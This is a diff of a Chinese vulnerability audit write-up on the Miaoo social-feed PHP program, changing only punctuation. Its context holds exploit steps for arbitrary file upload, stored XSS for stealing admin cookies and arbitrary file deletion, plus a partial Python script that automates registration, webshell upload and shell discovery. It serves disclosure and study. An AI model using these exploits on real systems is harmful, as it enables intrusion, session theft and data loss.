@@ -16,15 +16,15 @@ Miaoo 朋友圈程序审计
 
 ## 0x00 前言
 
-**程序介绍:**  
-**前台一键发布图文，视频，音乐。发布内容支持定位或自定义位置信息。支持将发布内容设为广告模式消息站内通知或邮件通知。支持其他用户注册,支持其他用户发布文章,管理自己的文章。拥有丰富的后台管理功能，一键操作。**  
+**程序介绍：**  
+**前台一键发布图文，视频，音乐。发布内容支持定位或自定义位置信息。支持将发布内容设为广告模式消息站内通知或邮件通知。支持其他用户注册，支持其他用户发布文章，管理自己的文章。拥有丰富的后台管理功能，一键操作。**  
 [![](assets/1711465840-6ac25441b01972ba93b9ed01b875bc4c.webp)](https://xzfile.aliyuncs.com/media/upload/picture/20240324205347-8e1017c4-e9dd-1.webp)  
-**目录结构:**  
+**目录结构：**  
 [![](assets/1711465840-91f6b34446206e583e71861e05547ca8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240324205412-9d0a657c-e9dd-1.png)
 
 ## 0x01 前台任意文件上传
 
-**需要普通用户权限(可直接注册)，在/api/uploadavatar.php 头像更新处，move\_uploaded\_file导致任意文件上传，只需要绕过Content-Type即可随便上传.**
+**需要普通用户权限 (可直接注册)，在/api/uploadavatar.php 头像更新处，move\_uploaded\_file 导致任意文件上传，只需要绕过 Content-Type 即可随便上传。**
 
 ```plain
 $str = "../user/headimg/";
@@ -41,10 +41,10 @@ if ($extension == "") {
 }
 if ($file["type"] == "image/jpeg" || $file["type"] == "image/png" || $file["type"] == "image/jpg" || $file["type"] == "image/gif" || $file["type"] == "image/webp" && in_array($extension, $allowedExts)) {
 } else {
-    exit("<script language=\"JavaScript\">;alert(\"文件类型错误,请上传图片!\");location.href=\"../setup.php\";</script>;");
+    exit("<script language=\"JavaScript\">;alert(\"文件类型错误，请上传图片!\");location.href=\"../setup.php\";</script>;");
 }
 if ($file["size"] > 5242880) {
-    exit("<script language=\"JavaScript\">;alert(\"请上传5MB以内的图片!\");location.href=\"../setup.php\";</script>;");
+    exit("<script language=\"JavaScript\">;alert(\"请上传 5MB 以内的图片!\");location.href=\"../setup.php\";</script>;");
 }
 $path = "../user/headimg/";
 $file_name = mt_rand() . str_replace(".", "", microtime(true)) . substr(md5($zjzhq), 0, 12) . $file["name"];
@@ -101,13 +101,13 @@ Content-Type: image/jpeg
 ```
 
 [![](assets/1711465840-782644ad47a6ad1a0f74b174c00ab5c3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240324205551-d8335f78-e9dd-1.png)  
-**然后直接访问 /setup.php 即可获取到文件地址.**
+**然后直接访问 /setup.php 即可获取到文件地址。**
 
 [![](assets/1711465840-011369137806b9f032e9b2473cbbddb6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240324205605-e093372e-e9dd-1.png)
 
-## 0x02 前台存储型XSS
+## 0x02 前台存储型 XSS
 
-**在 /api/reg.php 中，判断注册ip的逻辑存在缺陷，可直接使用X-Forwarded-For自定IP，使用XSS可导致管理员Cookie被盗取等危害.**
+**在 /api/reg.php 中，判断注册 ip 的逻辑存在缺陷，可直接使用 X-Forwarded-For 自定 IP，使用 XSS 可导致管理员 Cookie 被盗取等危害。**
 
 ```plain
 if ($HTTP_SERVER_VARS["HTTP_X_FORWARDED_FOR"]) {
@@ -127,7 +127,7 @@ if ($HTTP_SERVER_VARS["HTTP_X_FORWARDED_FOR"]) {
 }
 ```
 
-**注册还需要allkey密钥，看了一眼allkey的验证逻辑:**
+**注册还需要 allkey 密钥，看了一眼 allkey 的验证逻辑：**
 
 ```plain
 if ($allkey == "") {
@@ -173,13 +173,13 @@ sec-ch-ua-platform: "Windows"
 zh=aaaaaasa&em=dasdasaaasd@qq.com&mm=dasdasd&allkey=1a8eed4f3e05c811c6b1c5550102e86f&yzm=undefined
 ```
 
-**管理员在后台查看用户时即可弹出XSS**
+**管理员在后台查看用户时即可弹出 XSS**
 
 [![](assets/1711465840-b433126c141a7d498db1f12a4ea34f1b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240324205757-22da8740-e9de-1.png)
 
 ## 0x03 后台任意文件删除
 
-**在/admin/rm.php 中 存在unlink函数 直接导致了任意文件删除漏洞 只需登录后传入filew参数即可删除任意文件.**
+**在/admin/rm.php 中 存在 unlink 函数 直接导致了任意文件删除漏洞 只需登录后传入 filew 参数即可删除任意文件。**
 
 ```plain
 $filew = addslashes(htmlspecialchars($_GET["filew"]));
@@ -194,7 +194,7 @@ if ($filew != "") {
         header("Location: ./rm.php");
       }
     } else {
-      exit("<script language=\"JavaScript\">;alert(\"文件删除失败,请重试!\");location.href=\"./rm.php\";</script>");
+      exit("<script language=\"JavaScript\">;alert(\"文件删除失败，请重试!\");location.href=\"./rm.php\";</script>");
     }
   } else {
     header("Location: ./rm.php");
@@ -226,7 +226,7 @@ sec-fetch-user: ?1
 
 [![](assets/1711465840-a09ba9a20718e7fed907b6e6ae76458b.gif)](https://xzfile.aliyuncs.com/media/upload/picture/20240324205931-5addd7e6-e9de-1.gif)
 
-## 0x04 Python脚本编写
+## 0x04 Python 脚本编写
 
 ```plain
 import re
@@ -242,7 +242,7 @@ aaa = session.post(url + "/api/reg.php",data={'zh':user,'em':user + '@qq.com','m
 if "注册成功" in aaa:
     bbb = session.post(url + '/api/login.php',data={'zh':user,'mm':user})
     ccc = session.post(url + '/api/uploadavatar.php',files=files)
-    print('注册成功 账号:' + user + "  密码:" + user)
+    print('注册成功 账号:' + user + "  密码：" + user)
     if '上传成功' in ccc.text:
         ddd = session.get(url + '/setup.php').text
         shell = str(re.findall(r'data-src="./(.*)" id="setup-main-lieb-qx-imgt',ddd,re.DOTALL))
@@ -255,4 +255,4 @@ else:
 
 ## 0x05 总结
 
-**这套系统整体危险函数还是比较多的，上传点不止一个，且不注意伪造ip，各位师傅们可以自行研究.**
+**这套系统整体危险函数还是比较多的，上传点不止一个，且不注意伪造 ip，各位师傅们可以自行研究。**
